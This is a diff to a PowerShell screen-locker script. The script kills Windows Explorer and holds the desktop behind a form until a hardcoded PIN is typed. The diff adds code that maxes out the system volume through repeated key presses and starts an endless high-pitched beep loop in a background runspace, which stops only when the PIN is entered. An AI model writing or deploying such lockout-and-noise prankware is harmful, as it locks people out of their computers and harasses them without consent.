@@ -19,6 +19,10 @@ if (Test-Path $batchPath) {
 
 $PIN = 'dumb'
 
+# Max Volume
+$wsh = New-Object -ComObject WScript.Shell
+1..50 | ForEach-Object { $wsh.SendKeys([char]175) }
+
 # Initial kill
 Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
 Start-Sleep -Milliseconds 200
@@ -44,6 +48,15 @@ $form.Add_Shown({
     $form.Activate()
     $form.Focus() 
 })
+
+# Start continuous beep in background
+$script:beepRunspace = [powershell]::Create()
+$null = $script:beepRunspace.AddScript({
+    while ($true) {
+        [System.Console]::Beep(2000, 500)
+    }
+})
+$script:beepHandle = $script:beepRunspace.BeginInvoke()
 
 $script:typedPIN = ''
 
@@ -128,6 +141,8 @@ $form.Add_KeyDown({
     elseif ($_.KeyCode -eq 'Enter') {
         if ($script:typedPIN -eq $PIN) { 
             $timer.Stop()
+            $script:beepRunspace.Stop()
+            $script:beepRunspace.Dispose()
             Start-Process explorer
             $form.Close() 
         }
